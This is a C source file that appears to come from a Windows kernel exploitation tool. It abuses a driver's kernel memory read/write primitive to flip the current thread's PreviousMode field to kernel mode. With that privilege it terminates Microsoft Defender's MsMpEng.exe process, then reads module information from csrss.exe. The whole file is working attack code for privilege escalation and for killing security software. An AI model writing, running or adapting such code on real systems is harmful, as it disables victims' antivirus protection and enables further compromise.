#include "struct.h"

void PreviousMode(PINFORMATION pInfor)
{
	HANDLE hThread = NULL, hProcess = NULL, hTargetThread = NULL;
	DWORD dwThread = 0, dwCurrentProcessId = 0, targetPid;
	PSYSTEM_HANDLE_INFORMATION GlobalHandle = NULL;
	UCHAR ThreadIndex = 0;
	ULONG_PTR targetObject;
	ULONG pre;
	PVOID baseAddress = NULL, outBuffer = NULL;
	PSYSTEM_PROCESS_INFORMATION ProcessInformation = NULL;
	ULONG_PTR out;
	PROCESS_BASIC_INFORMATION processInfo;
	ULONG szInfo;
	PEB Peb;
	PEB_LDR_DATA LdrData; LDR_DATA_TABLE_ENTRY LdrEntry;
	PBYTE aLire, fin;
	PWSTR module = NULL;
	NTSTATUS status;
	CLIENT_ID Client = { 0 };
	OBJECT_ATTRIBUTES ObjectAttributes;

	dwThread = GetCurrentThreadId();
	dwCurrentProcessId = GetCurrentProcessId();
	Client.UniqueThread = ULongToHandle(dwThread);
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	
	RtlAdjustPrivilege(20, TRUE, FALSE, &pre);
	status = NtOpenThread(&hThread, THREAD_QUERY_LIMITED_INFORMATION, &ObjectAttributes, &Client);

	if (NT_SUCCESS(status))
	{
		if (NT_SUCCESS(GetGlobalHandleTable(&GlobalHandle)))
		{
			if (GetHandleTypeIndex(GlobalHandle, &ThreadIndex, L"Thread", dwCurrentProcessId))
			{
				if (GetTargetObjectAddress(GlobalHandle, dwCurrentProcessId, hThread, &targetObject, ThreadIndex) && NT_SUCCESS(GetGlobalProcessInformation(&ProcessInformation)))
				{
					wprintf(L"[*] Current _KTHREAD @ %I64X\n", targetObject);

					UtilReadKernelMemory(pInfor->hDevice, targetObject + pInfor->PreviousMode.PreviousModeOffset, &out);
					//out &= ~(ULONG_PTR)1;
					UtilWriteKernelMemory(pInfor->hDevice, targetObject + pInfor->PreviousMode.PreviousModeOffset, out & ~(ULONG_PTR)1);
		
					if (GetProcessID(ProcessInformation, L"MsMpEng.exe", &targetPid))
					{
						InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
						RtlSecureZeroMemory(&Client, sizeof(Client));
						Client.UniqueProcess = ULongToHandle(targetPid);
						status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &Client);
						if (NT_SUCCESS(status))
						{
							status = ZwTerminateProcess(hProcess, 0);
							if (NT_SUCCESS(status))
							{
								wprintf(L"[*] TerminateProcess Success\n");
							}
							else PRINT_ERROR(L"ZwTerminateProcess %08x\n", status);
							
						}
						else PRINT_ERROR(L"NtOpenProcess %08x\n", status);
					}
					if (GetProcessID(ProcessInformation, L"csrss.exe", &dwCurrentProcessId))
					{

						InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
						RtlSecureZeroMemory(&Client, sizeof(Client));
						Client.UniqueProcess = ULongToHandle(dwCurrentProcessId);
						status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &Client);

						if (NT_SUCCESS(status))
						{
							RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
							status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInfo, sizeof(processInfo), &szInfo);
							if (NT_SUCCESS(status))
							{
								status = NtReadVirtualMemory(hProcess, processInfo.PebBaseAddress, &Peb, sizeof(Peb), NULL);
								if (NT_SUCCESS(status))
								{
									status = NtReadVirtualMemory(hProcess, Peb.Ldr, &LdrData, sizeof(LdrData), NULL);
									if (NT_SUCCESS(status))
									{
										for (
											aLire = (PBYTE)(LdrData.InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
											fin = (PBYTE)(Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
											(aLire != fin);
											aLire = (PBYTE)LdrEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
											)
										{
											NtReadVirtualMemory(hProcess, aLire, &LdrEntry, sizeof(LdrEntry), NULL);
											if (module = LocalAlloc(LPTR, LdrEntry.BaseDllName.MaximumLength))
											{
												NtReadVirtualMemory(hProcess, LdrEntry.BaseDllName.Buffer, module, LdrEntry.BaseDllName.Length, NULL);
												wprintf(L"%p %ws\n", LdrEntry.DllBase, module);
												LocalFree(module);
											}
										}
									}
									else PRINT_ERROR(L"NtReadVirtualMemory ldr %08x\n", status);
								}
								else PRINT_ERROR(L"NtReadVirtualMemory Peb %08x\n", status);
							}
							else PRINT_ERROR(L"NtQueryInformationProcess %08x\n", status);

							NtClose(hProcess);
						}
					}
					UtilWriteKernelMemory(pInfor->hDevice, targetObject + pInfor->PreviousMode.PreviousModeOffset, out);
					LocalFree(ProcessInformation);
				}
			}
			LocalFree(GlobalHandle);
		}
	}
	else PRINT_ERROR(L"NtOpenThread %08x\n", status);
}